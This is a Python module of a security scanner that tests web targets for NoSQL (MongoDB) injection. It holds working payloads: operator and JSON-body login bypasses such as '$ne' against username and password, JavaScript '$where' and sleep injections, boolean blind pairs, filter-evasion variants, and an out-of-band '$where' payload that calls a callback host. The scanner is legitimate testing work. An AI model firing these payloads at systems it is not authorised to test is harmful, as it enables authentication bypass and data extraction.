"""
NoSQL Injection Scanner — InsertionPoint per-parameter isolation.

Architecture:
  - Uses InsertionPointDiscovery for automatic injection-point enumeration
  - Per-parameter isolation: each param tested individually
  - 7 phases: operator injection, value injection, boolean blind,
    JSON body, POST forms, error probes, OOB blind
  - Baseline-aware error detection via ErrorPatternMatcher
  - found_vulns set prevents duplicate findings on same (endpoint, param)
"""

import json
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from secprobe.config import Severity
from secprobe.core.detection import Confidence, ErrorPatternMatcher, ResponseAnalyzer
from secprobe.core.exceptions import TargetUnreachableError
from secprobe.core.insertion_points import (
    InsertionPointDiscovery, InsertionType, send_request,
)
from secprobe.scanners.smart_scanner import SmartScanner
from secprobe.utils import normalize_url, print_status, print_finding


# MongoDB operator payloads — appended to param NAME (e.g. username[$gt]=)
OPERATOR_PAYLOADS = [
    ("[$gt]=", "Operator $gt bypass"),
    ("[$ne]=", "Operator $ne bypass"),
    ("[$ne]=invalid", "Operator $ne (value)"),
    ("[$gte]=", "Operator $gte bypass"),
    ("[$lte]=~", "Operator $lte bypass"),
    ("[$regex]=.*", "Regex extraction"),
    ("[$regex]=^a", "Regex prefix probe"),
    ("[$exists]=true", "Existence check"),
    ("[$where]=1==1", "JavaScript $where true"),
    ("[$nin][]=", "Operator $nin bypass"),
    ("[$in][]=admin", "Operator $in"),
    ("[$not][$gt]=", "Negated $not $gt"),
    ("[$type]=2", "BSON type string match"),
    ("[$size]=0", "Array size match"),
]

# Value injection payloads — replace param VALUE
VALUE_PAYLOADS = [
    ("true", "JavaScript truthy"),
    ('{"$gt":""}', "JSON in query param"),
    ("{$gt: ''}", "BSON-style in query"),
    ("admin'||'1'=='1", "JS string OR"),
    ("';return true;var a='", "JS return true"),
    ("1;sleep(2000)", "JS sleep probe"),
    ("||1==1", "Logical OR true"),
]

# JSON body payloads
JSON_INJECTION_PAYLOADS = [
    ({"$gt": ""}, "MongoDB $gt empty"),
    ({"$ne": ""}, "MongoDB $ne empty"),
    ({"$ne": None}, "MongoDB $ne null"),
    ({"$ne": 1}, "MongoDB $ne numeric"),
    ({"$regex": ".*"}, "MongoDB regex wildcard"),
    ({"$regex": "^a"}, "MongoDB regex prefix"),
    ({"$exists": True}, "MongoDB $exists true"),
    ({"$where": "1==1"}, "MongoDB $where JS"),
    ({"$gt": "", "$lt": "~"}, "MongoDB range bypass"),
    ({"$in": ["admin", "root"]}, "MongoDB $in array"),
    ({"$or": [{"admin": True}]}, "MongoDB $or"),
]

# Boolean pairs
BOOLEAN_PAIRS = [
    ("[$where]=1==1", "[$where]=1==2"),
    ("[$where]=return true", "[$where]=return false"),
    ("[$regex]=.*", "[$regex]=^$impossiblevalue$"),
    ("[$gt]=", "[$gt]=~~~~~"),
    ("[$ne]=impossiblevalue999", "[$eq]=impossiblevalue999"),
]


class NoSQLScanner(SmartScanner):
    name = "NoSQL Scanner"
    description = "Test for NoSQL Injection vulnerabilities (MongoDB, CouchDB, etc.)"

    def scan(self):
        url = normalize_url(self.config.target)
        print_status(f"Testing NoSQL injection on {url}", "progress")

        engine = self._init_detection_engine()

        try:
            baseline = self.http_client.get(url)
            baseline_text = baseline.text
        except TargetUnreachableError as e:
            print_status(f"Cannot reach target: {e}", "error")
            self.result.error = str(e)
            return

        # ── Discover insertion points ────────────────────────────────
        discovery = InsertionPointDiscovery(
            include_headers=False,
            include_cookies=True,
            include_paths=False,
        )
        points = discovery.discover(url, response=baseline)
        query_points = [p for p in points if p.type == InsertionType.QUERY_PARAM]

        # Profile endpoint for baseline
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        engine.profile(url, params=params or None)

        found_vulns = set()  # (endpoint, param) pairs

        # ── Detect target technology ─────────────────────────────────
        baseline_tech = self.detect_technology(baseline_text)
        if baseline_tech:
            print_status(f"Technology detected: {', '.join(baseline_tech)}", "info")

        # If no query params, synthesise common LDAP/NoSQL-like params
        if not query_points:
            common = ["username", "user", "email", "password", "login",
                      "id", "search", "q", "query", "filter"]
            for p in common:
                test_url = f"{url}{'&' if '?' in url else '?'}{p}=test"
                pts = discovery.discover(test_url)
                query_points.extend(
                    pt for pt in pts
                    if pt.type == InsertionType.QUERY_PARAM and pt.name == p
                )

        # Phase 1 – MongoDB operator injection (per-param)
        self._test_operator_injection(url, query_points, baseline_text, engine, found_vulns)

        # Phase 2 – Value injection (per-param via InsertionPoint)
        self._test_value_injection(query_points, baseline_text, found_vulns)

        # Phase 3 – Boolean blind (per-param)
        self._test_boolean(url, query_points, baseline_text, engine, found_vulns)

        # Phase 4 – JSON body injection
        self._test_json_injection(url, baseline_text, found_vulns)

        # Phase 5 – POST form injection (per-field)
        forms = self.context.get_injectable_forms() if self.context else []
        self._test_forms(url, forms, baseline_text, found_vulns)

        # Phase 6 – Error probes (malformed JSON)
        self._test_error_probes(url, baseline_text, found_vulns)

        # Phase 7 – OOB blind
        self._test_oob(url, query_points, found_vulns)

        if not found_vulns:
            self.add_finding(
                title="No NoSQL injection detected",
                severity=Severity.INFO,
                description="Automated tests did not detect NoSQL injection vulnerabilities.",
                category="NoSQL Injection",
            )

    # ── Phase 1 ──────────────────────────────────────────────────────
    def _test_operator_injection(self, url, query_points, baseline_text, engine, found_vulns):
        """Inject MongoDB operators per-param (modifies param NAME)."""
        print_status("Phase 1: Per-param NoSQL operator injection", "progress")

        for point in query_points:
            param_name = point.name
            if (url, param_name) in found_vulns:
                continue

            for suffix, desc in OPERATOR_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                injected_url = self._build_operator_url(url, param_name, suffix)

                payload_variants = self._evade_payload(suffix, vuln_type="nosql")
                resp = None
                for p in payload_variants:
                    alt_url = self._build_operator_url(url, param_name, p)
                    try:
                        resp = self.http_client.get(alt_url, allow_redirects=False)
                        injected_url = alt_url
                        break
                    except Exception:
                        continue

                if resp is None:
                    continue

                result = engine.test_error_based(
                    url=injected_url, parameter=param_name, payload=suffix,
                    response_text=resp.text, response_status=resp.status_code,
                    vuln_category="nosql",
                )
                if result.confidence >= Confidence.FIRM:
                    found_vulns.add((url, param_name))
                    self.add_finding(
                        title=f"NoSQL Operator Injection: {desc}",
                        severity=Severity.HIGH,
                        description=(
                            f"NoSQL error on '{param_name}' via {point.display_name} "
                            f"(confidence: {result.confidence.name}).\n"
                            f"Evidence: {'; '.join(result.evidence[:2])}"
                        ),
                        recommendation="Use parameterised queries. Never build queries from raw input.",
                        evidence=f"URL: {injected_url}\nParam: {param_name}\nOperator: {suffix}",
                        category="NoSQL Injection", url=injected_url, cwe="CWE-943",
                    )
                    print_finding(Severity.HIGH, f"NoSQL: {desc} on {param_name}")
                    break  # skip remaining payloads for this param

    # ── Phase 2 ──────────────────────────────────────────────────────
    def _test_value_injection(self, query_points, baseline_text, found_vulns):
        """Inject NoSQL values per-param using InsertionPoint."""
        print_status("Phase 2: Per-param NoSQL value injection", "progress")

        for point in query_points:
            base_url = point.inject("").url
            if (base_url, point.name) in found_vulns:
                continue

            for payload, desc in VALUE_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                spec = point.inject(payload, mode="replace")
                try:
                    resp = send_request(self.http_client, spec)
                except Exception:
                    continue

                matches = ErrorPatternMatcher.match_nosql_errors(resp.text, baseline_text)
                if matches:
                    best = max(matches, key=lambda m: m.confidence)
                    if best.confidence >= Confidence.FIRM:
                        found_vulns.add((base_url, point.name))
                        self.add_finding(
                            title=f"NoSQL Value Injection: {desc}",
                            severity=Severity.HIGH,
                            description=f"NoSQL error via {point.display_name} ({best.confidence.name}).",
                            recommendation="Use parameterised queries.",
                            evidence=f"Point: {point.display_name}\nPayload: {payload}",
                            category="NoSQL Injection", url=spec.url, cwe="CWE-943",
                        )
                        break

    # ── Phase 3 ──────────────────────────────────────────────────────
    def _test_boolean(self, url, query_points, baseline_text, engine, found_vulns):
        """Boolean-based blind NoSQL per-param."""
        print_status("Phase 3: Boolean-based NoSQL detection", "progress")

        for point in query_points:
            if (url, point.name) in found_vulns:
                continue

            for true_sfx, false_sfx in BOOLEAN_PAIRS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                true_url = self._build_operator_url(url, point.name, true_sfx)
                false_url = self._build_operator_url(url, point.name, false_sfx)

                try:
                    true_resp = self.http_client.get(true_url, allow_redirects=False)
                    false_resp = self.http_client.get(false_url, allow_redirects=False)
                except Exception:
                    continue

                result = engine.test_boolean(
                    url=url, parameter=point.name,
                    true_response=true_resp.text, false_response=false_resp.text,
                    true_size=len(true_resp.text), false_size=len(false_resp.text),
                    payload_desc=f"NoSQL boolean: {true_sfx}",
                )
                if result.confidence >= Confidence.FIRM:
                    found_vulns.add((url, point.name))
                    self.add_finding(
                        title=f"Blind NoSQL Injection on '{point.name}'",
                        severity=Severity.HIGH,
                        description=(
                            f"Boolean analysis via {point.display_name} "
                            f"(confidence: {result.confidence.name})."
                        ),
                        recommendation="Use parameterised queries.",
                        evidence=f"True: {true_url}\nFalse: {false_url}",
                        category="NoSQL Injection", url=true_url, cwe="CWE-943",
                    )
                    break

    # ── Phase 4 ──────────────────────────────────────────────────────
    def _test_json_injection(self, url, baseline_text, found_vulns):
        """JSON body injection with MongoDB operators."""
        print_status("Phase 4: JSON body NoSQL injection", "progress")

        test_bodies = []
        for op_val, desc in JSON_INJECTION_PAYLOADS:
            test_bodies.append(({"username": op_val, "password": op_val}, f"{desc} (dual)"))
            test_bodies.append(({"username": "admin", "password": op_val}, f"{desc} (admin)"))

        for body, desc in test_bodies:
            if self.config.rate_limit:
                time.sleep(self.config.rate_limit)
            try:
                resp = self.http_client.post(
                    url, json=body,
                    headers={"Content-Type": "application/json"},
                )
            except Exception:
                continue

            matches = ErrorPatternMatcher.match_nosql_errors(resp.text, baseline_text)
            if matches:
                best = max(matches, key=lambda m: m.confidence)
                if best.confidence >= Confidence.FIRM:
                    found_vulns.add((url, "json_body"))
                    self.add_finding(
                        title=f"NoSQL JSON Injection: {desc}",
                        severity=Severity.HIGH,
                        description=f"JSON operator injection caused error ({best.confidence.name}).",
                        recommendation="Sanitise JSON input. Use schema validation.",
                        evidence=f"URL: {url}\nBody: {json.dumps(body)[:200]}",
                        category="NoSQL Injection", url=url, cwe="CWE-943",
                    )

    # ── Phase 5 ──────────────────────────────────────────────────────
    def _test_forms(self, url, forms, baseline_text, found_vulns):
        """POST form injection per-field."""
        print_status("Phase 5: POST form NoSQL injection", "progress")

        for form in forms:
            action = form.get("action", url)
            fields = form.get("fields", {})

            for field_name in fields:
                if (action, field_name) in found_vulns:
                    continue

                for suffix, desc in OPERATOR_PAYLOADS[:6]:
                    post_data = dict(fields)
                    post_data[f"{field_name}{suffix}"] = ""

                    try:
                        resp = self.http_client.post(action, data=post_data)
                    except Exception:
                        continue

                    matches = ErrorPatternMatcher.match_nosql_errors(resp.text, baseline_text)
                    if matches:
                        best = max(matches, key=lambda m: m.confidence)
                        if best.confidence >= Confidence.FIRM:
                            found_vulns.add((action, field_name))
                            self.add_finding(
                                title=f"NoSQL Injection (POST) via '{field_name}'",
                                severity=Severity.HIGH,
                                description=f"Form injection on '{field_name}' ({best.confidence.name}).",
                                recommendation="Sanitise form input.",
                                evidence=f"Form: {action}\nField: {field_name}\nOp: {suffix}",
                                category="NoSQL Injection", url=action, cwe="CWE-943",
                            )
                            break

    # ── Phase 6 ──────────────────────────────────────────────────────
    def _test_error_probes(self, url, baseline_text, found_vulns):
        """Malformed queries for error message leaks."""
        print_status("Phase 6: Error-based NoSQL probes", "progress")

        probes = [
            '{"$gt": }',
            "{'$where': 'function(){throw new Error(\"xxe\")}'}",
            '{"username": {"$invalid": 1}}',
            '{"$and": [}',
            '{"username": {"$regex": "[invalid"}}',
            '{"$or": [{"a": 1}, ]}',
        ]

        for probe in probes:
            if self.config.rate_limit:
                time.sleep(self.config.rate_limit)
            try:
                resp = self.http_client.post(
                    url, data=probe,
                    headers={"Content-Type": "application/json"},
                )
            except Exception:
                continue

            matches = ErrorPatternMatcher.match_nosql_errors(resp.text, baseline_text)
            if matches:
                best = max(matches, key=lambda m: m.confidence)
                if best.confidence >= Confidence.FIRM:
                    found_vulns.add((url, "error_probe"))
                    self.add_finding(
                        title="NoSQL Error Information Leak",
                        severity=Severity.MEDIUM,
                        description=f"Malformed input triggered NoSQL error ({best.confidence.name}).",
                        recommendation="Suppress detailed error messages in production.",
                        evidence=f"URL: {url}\nProbe: {probe[:100]}",
                        category="NoSQL Injection", url=url, cwe="CWE-943",
                    )

    # ── Phase 7 ──────────────────────────────────────────────────────
    def _test_oob(self, url, query_points, found_vulns):
        """OOB blind NoSQL injection via $where + XMLHttpRequest."""
        if not self.oob_available:
            return

        print_status("Phase 7: OOB blind NoSQL injection", "progress")
        oob_count = 0

        for point in query_points[:5]:
            token = self.oob_generate_token(url, point.name, "nosql_oob", "where_fetch")
            cb_url = self.oob_get_url(token)
            payload = f"1;var x=new XMLHttpRequest();x.open('GET','{cb_url}');x.send();"
            spec = point.inject(payload, mode="replace")
            try:
                send_request(self.http_client, spec)
                oob_count += 1
            except Exception:
                pass

        # JSON body OOB
        token = self.oob_generate_token(url, "json_body", "nosql_oob", "where_json")
        cb_url = self.oob_get_url(token)
        body = {
            "username": {"$where": f"var x=new XMLHttpRequest();x.open('GET','{cb_url}');x.send();return true;"}
        }
        try:
            self.http_client.post(url, json=body, headers={"Content-Type": "application/json"})
            oob_count += 1
        except Exception:
            pass

        if oob_count:
            print_status(f"Sent {oob_count} OOB NoSQL payloads", "progress")
            self.oob_collect_findings(wait_seconds=10)

    # ── Helpers ───────────────────────────────────────────────────────
    def _build_operator_url(self, url, param_name, suffix):
        """Build URL with MongoDB operator on ONE specific param only."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        new_params = {}
        for k, v in params.items():
            new_params[k] = v[0] if v else "test"
        new_params[f"{param_name}{suffix}"] = ""
        return urlunparse(parsed._replace(query=urlencode(new_params)))
